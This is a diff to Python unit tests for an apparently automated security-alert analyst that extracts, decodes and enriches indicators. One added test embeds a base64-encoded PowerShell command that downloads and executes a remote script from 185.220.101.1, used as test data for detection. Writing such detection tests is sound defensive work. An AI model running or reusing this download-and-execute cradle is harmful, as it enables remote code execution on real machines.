@@ -205,7 +205,7 @@ def test_step_extract_indicators_finds_and_validates_ip():
     analyst = _make_analyst()
     alert = _make_alert(full_log="Invalid user admin from 203.0.113.5")
 
-    indicators, step = analyst._step_extract_indicators(alert, model_available=False)
+    indicators, _, step = analyst._step_extract_indicators(alert, model_available=False)
 
     assert len(indicators) == 1
     assert indicators[0].value == "203.0.113.5"
@@ -217,7 +217,7 @@ def test_step_extract_indicators_returns_empty_list_when_nothing_found():
     analyst = _make_analyst()
     alert = _make_alert(full_log="nothing interesting here")
 
-    indicators, step = analyst._step_extract_indicators(alert, model_available=False)
+    indicators, _, step = analyst._step_extract_indicators(alert, model_available=False)
 
     assert indicators == []
     assert step.action == "completed"
@@ -227,7 +227,7 @@ def test_step_extract_indicators_skips_llm_when_model_unavailable():
     analyst = _make_analyst()
     alert = _make_alert(full_log="nothing interesting here")
 
-    _, step = analyst._step_extract_indicators(alert, model_available=False)
+    _, _, step = analyst._step_extract_indicators(alert, model_available=False)
 
     assert "LLM-assisted extraction skipped: model unavailable" in step.output_summary
 
@@ -244,7 +244,7 @@ def test_step_extract_indicators_merges_llm_candidates_with_regex_results():
     analyst = _make_analyst(llm_client=llm_client)
     alert = _make_alert(full_log="Invalid user admin from 203.0.113.5")
 
-    indicators, step = analyst._step_extract_indicators(alert, model_available=True)
+    indicators, _, step = analyst._step_extract_indicators(alert, model_available=True)
 
     values = {i.value for i in indicators}
     assert values == {"203.0.113.5", "evil.test"}
@@ -263,7 +263,7 @@ def test_step_extract_indicators_discards_invalid_llm_candidates():
     analyst = _make_analyst(llm_client=llm_client)
     alert = _make_alert(full_log="nothing interesting here")
 
-    indicators, step = analyst._step_extract_indicators(alert, model_available=True)
+    indicators, _, step = analyst._step_extract_indicators(alert, model_available=True)
 
     assert indicators == []
     assert "LLM: 1 candidates, 0 validated" in step.output_summary
@@ -274,18 +274,45 @@ def test_step_extract_indicators_keeps_regex_results_when_llm_call_fails():
     analyst = _make_analyst(llm_client=llm_client)
     alert = _make_alert(full_log="Invalid user admin from 203.0.113.5")
 
-    indicators, step = analyst._step_extract_indicators(alert, model_available=True)
+    indicators, _, step = analyst._step_extract_indicators(alert, model_available=True)
 
     assert len(indicators) == 1
     assert indicators[0].value == "203.0.113.5"
     assert "LLM-assisted extraction failed: timeout" in step.output_summary
 
 
+def test_step_extract_indicators_decodes_and_extracts_ioc_from_encoded_command():
+    from app.schemas import ProcessExecutionFields
+
+    ps_b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4AMQAvAGEALgBwAHMAMQAnACkA"
+    analyst = _make_analyst()
+    alert = _make_alert(
+        full_log="",
+        process=ProcessExecutionFields(command_line=f"powershell.exe -EncodedCommand {ps_b64}"),
+    )
+
+    indicators, command_decode_result, step = analyst._step_extract_indicators(alert, model_available=False)
+
+    assert any(i.value == "185.220.101.1" for i in indicators)
+    assert command_decode_result is not None
+    assert len(command_decode_result.decoded_segments) == 1
+    assert "command decode: 1 segment(s) decoded, 0 discarded" in step.output_summary
+
+
+def test_step_extract_indicators_returns_none_command_decode_result_when_no_process_fields():
+    analyst = _make_analyst()
+    alert = _make_alert(full_log="Invalid user admin from 203.0.113.5")
+
+    _, command_decode_result, _ = analyst._step_extract_indicators(alert, model_available=False)
+
+    assert command_decode_result is None
+
+
 def test_step_enrich_calls_registry_for_each_indicator():
     registry = EnrichmentRegistry()
     registry.register(_FakeIPProvider(result=_make_enrichment_result()))
     analyst = _make_analyst(enrichment_registry=registry)
-    indicators, _ = analyst._step_extract_indicators(
+    indicators, _, _ = analyst._step_extract_indicators(
         _make_alert(full_log="Invalid user admin from 203.0.113.5"), model_available=False
     )
 
@@ -1194,7 +1221,7 @@ def test_investigate_degrades_gracefully_when_siem_context_unavailable(tmp_path)
 
 def test_step_enrich_degrades_when_no_provider_registered_for_type():
     analyst = _make_analyst(enrichment_registry=EnrichmentRegistry())
-    indicators, _ = analyst._step_extract_indicators(
+    indicators, _, _ = analyst._step_extract_indicators(
         _make_alert(full_log="Invalid user admin from 203.0.113.5"), model_available=False
     )
 
@@ -1366,7 +1393,7 @@ def test_step_enrich_logs_input_and_output(caplog):
     registry = EnrichmentRegistry()
     registry.register(_FakeIPProvider(result=_make_enrichment_result()))
     analyst = _make_analyst(enrichment_registry=registry)
-    indicators, _ = analyst._step_extract_indicators(
+    indicators, _, _ = analyst._step_extract_indicators(
         _make_alert(full_log="Invalid user admin from 203.0.113.5"), model_available=False
     )
 
